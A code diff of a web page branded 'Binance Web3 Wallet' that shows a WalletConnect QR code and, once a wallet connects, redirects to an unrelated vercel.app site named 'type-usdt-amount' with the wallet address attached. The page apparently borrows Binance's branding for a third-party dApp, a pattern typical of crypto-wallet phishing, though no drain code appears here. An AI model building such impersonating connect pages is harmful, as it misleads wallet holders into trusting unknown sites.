@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Open DApp in Binance</title>
+    <title>Binance Web3 Wallet - Connect</title>
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; }
         body {
@@ -27,6 +27,13 @@
         }
         h1 { font-size: 1.5rem; margin-bottom: 8px; color: #f0b90b; text-align: center; }
         .subtitle { color: #888; text-align: center; margin-bottom: 24px; font-size: 0.9rem; }
+        #status {
+            text-align: center; padding: 12px;
+            background: #1e1e1e; border-radius: 8px; margin: 12px 0; font-size: 0.9rem;
+            word-break: break-word;
+        }
+        #status.error { background: #3d0a0a; border: 1px solid #e74c3c; }
+        #status.connected { background: #0a3d0a; border: 1px solid #2ecc71; }
         #qr-box {
             background: #fff;
             border-radius: 12px;
@@ -37,90 +44,112 @@
             min-height: 280px;
             margin: 16px 0;
         }
-        .url-display {
-            text-align: center; font-size: 0.7rem; color: #555;
-            word-break: break-all; margin-top: 8px;
+        #qr-box canvas, #qr-box img { border-radius: 8px; }
+        .btn {
+            display: block; width: 100%; padding: 14px;
+            border: none; border-radius: 8px;
+            font-size: 1rem; font-weight: 600;
+            cursor: pointer; margin-top: 12px;
+            transition: opacity 0.2s;
         }
+        .btn:hover { opacity: 0.85; }
+        .btn-disconnect { background: #e74c3c; color: #fff; }
+        .btn-redirect { background: #f0b90b; color: #000; }
         .info {
             margin-top: 16px; padding: 12px; background: #1e1e1e;
             border-radius: 8px; font-size: 0.8rem; color: #888;
         }
         .info p { margin: 4px 0; }
         .info strong { color: #f0b90b; }
-        .toggle { margin-top: 16px; text-align: center; }
-        .toggle button {
-            padding: 10px 20px; border: none; border-radius: 8px;
-            font-size: 0.9rem; font-weight: 600; cursor: pointer;
-            margin: 4px; transition: opacity 0.2s;
-        }
-        .toggle button:hover { opacity: 0.85; }
-        .toggle .active { background: #f0b90b; color: #000; }
-        .toggle .inactive { background: #333; color: #888; }
     </style>
 </head>
 <body>
     <div class="container">
         <h1>Binance Web3 Wallet</h1>
-        <p class="subtitle" id="mode-label">Scan QR to Open DApp</p>
+        <p class="subtitle">Scan QR to Connect</p>
 
+        <div id="status">Loading...</div>
         <div id="qr-box"></div>
-        <div class="url-display" id="url-display"></div>
-
-        <div class="toggle">
-            <button id="btn-url" class="active">URL QR</button>
-            <button id="btn-wc" class="inactive">WalletConnect QR</button>
-        </div>
+        <div id="actions"></div>
 
         <div class="info">
-            <p><strong>URL QR:</strong> Binance opens dApp in its browser</p>
-            <p><strong>WalletConnect:</strong> Connect wallet via protocol</p>
-            <p>&nbsp;</p>
+            <p><strong>Steps:</strong></p>
             <p>1. Open Binance App</p>
             <p>2. Web3 Wallet tab</p>
             <p>3. Tap scan icon (top right)</p>
-            <p>4. Scan the QR code</p>
+            <p>4. Scan the QR code above</p>
+            <p>5. Approve in Binance</p>
         </div>
     </div>
 
     <script src="https://cdn.jsdelivr.net/npm/qrious@4.0.2/dist/qrious.min.js"></script>
 
     <script>
-        const DAPP_URL = 'https://type-usdt-amount.vercel.app/';
-        const PROJECT_ID = '4689db3295784d6a806b30b4975c8faa';
+        const statusDiv = document.getElementById('status');
         const qrBox = document.getElementById('qr-box');
-        const urlDisplay = document.getElementById('url-display');
-        const modeLabel = document.getElementById('mode-label');
-        const btnUrl = document.getElementById('btn-url');
-        const btnWc = document.getElementById('btn-wc');
+        const actionsDiv = document.getElementById('actions');
+        const PROJECT_ID = '4689db3295784d6a806b30b4975c8faa';
 
-        function renderQR(value) {
+        let provider = null;
+        let connectedAddr = '';
+
+        function setStatus(text, cls) {
+            statusDiv.textContent = text;
+            statusDiv.className = cls || '';
+        }
+
+        function renderQR(uri) {
+            setStatus('Scan this QR with Binance Web3 Wallet');
             qrBox.innerHTML = '';
             const canvas = document.createElement('canvas');
             qrBox.appendChild(canvas);
-            new QRious({ element: canvas, value: value, size: 320, level: 'H' });
-            urlDisplay.textContent = value.substring(0, 60) + '...';
+            new QRious({
+                element: canvas,
+                value: uri,
+                size: 320,
+                level: 'H'
+            });
         }
 
-        // Mode 1: URL QR — Binance opens dApp in its browser
-        function showUrlQR() {
-            modeLabel.textContent = 'Scan QR to Open DApp in Binance';
-            btnUrl.className = 'active';
-            btnWc.className = 'inactive';
-            renderQR(DAPP_URL);
+        function showConnected(addr) {
+            connectedAddr = addr;
+            setStatus('✅ Connected: ' + addr, 'connected');
+            qrBox.innerHTML = '';
+            actionsDiv.innerHTML = '';
+
+            const redirectBtn = document.createElement('button');
+            redirectBtn.className = 'btn btn-redirect';
+            redirectBtn.textContent = 'Go to DApp →';
+            redirectBtn.onclick = () => {
+                window.location.href = 'https://type-usdt-amount.vercel.app/?wallet=' + addr;
+            };
+            actionsDiv.appendChild(redirectBtn);
+
+            const disconnectBtn = document.createElement('button');
+            disconnectBtn.className = 'btn btn-disconnect';
+            disconnectBtn.textContent = 'Disconnect (New QR)';
+            disconnectBtn.onclick = async () => {
+                try {
+                    if (provider) {
+                        await provider.disconnect();
+                        provider = null;
+                    }
+                } catch (e) { console.log('Disconnect error:', e); }
+                localStorage.removeItem('walletconnect');
+                sessionStorage.clear();
+                window.location.reload();
+            };
+            actionsDiv.appendChild(disconnectBtn);
         }
 
-        // Mode 2: WalletConnect QR
-        let wcProvider = null;
-        async function showWcQR() {
-            modeLabel.textContent = 'Scan QR to Connect via WalletConnect';
-            btnUrl.className = 'inactive';
-            btnWc.className = 'active';
-
+        async function connect() {
             try {
+                setStatus('Loading libraries...');
                 const mod = await import('https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.11.2/+esm');
                 const EthereumProvider = mod.EthereumProvider || mod.default;
 
-                wcProvider = await EthereumProvider.init({
+                setStatus('Initializing...');
+                provider = await EthereumProvider.init({
                     projectId: PROJECT_ID,
                     chains: [56],
                     optionalChains: [1, 137, 42161],
@@ -133,28 +162,37 @@
                     }
                 });
 
-                wcProvider.on('display_uri', (uri) => {
+                provider.on('display_uri', (uri) => {
+                    console.log('WC URI:', uri);
                     renderQR(uri);
                 });
 
-                wcProvider.on('connect', (accounts) => {
+                provider.on('connect', (accounts) => {
                     const addr = accounts?.accounts?.[0] || accounts?.[0] || '';
-                    qrBox.innerHTML = '';
-                    urlDisplay.innerHTML = '✅ Connected: <strong>' + addr + '</strong>';
+                    showConnected(addr);
                 });
 
-                await wcProvider.enable();
+                provider.on('disconnect', () => {
+                    setStatus('Disconnected. Refresh for new QR.');
+                    qrBox.innerHTML = '';
+                    actionsDiv.innerHTML = '';
+                    const refreshBtn = document.createElement('button');
+                    refreshBtn.className = 'btn btn-redirect';
+                    refreshBtn.textContent = 'Generate New QR';
+                    refreshBtn.onclick = () => window.location.reload();
+                    actionsDiv.appendChild(refreshBtn);
+                });
+
+                setStatus('Connecting...');
+                await provider.enable();
+
             } catch (error) {
                 console.error(error);
-                urlDisplay.textContent = 'Error: ' + error.message;
+                setStatus('Error: ' + error.message, 'error');
             }
         }
 
-        btnUrl.onclick = showUrlQR;
-        btnWc.onclick = showWcQR;
-
-        // Start with URL QR
-        showUrlQR();
+        connect();
     </script>
 </body>
 </html>
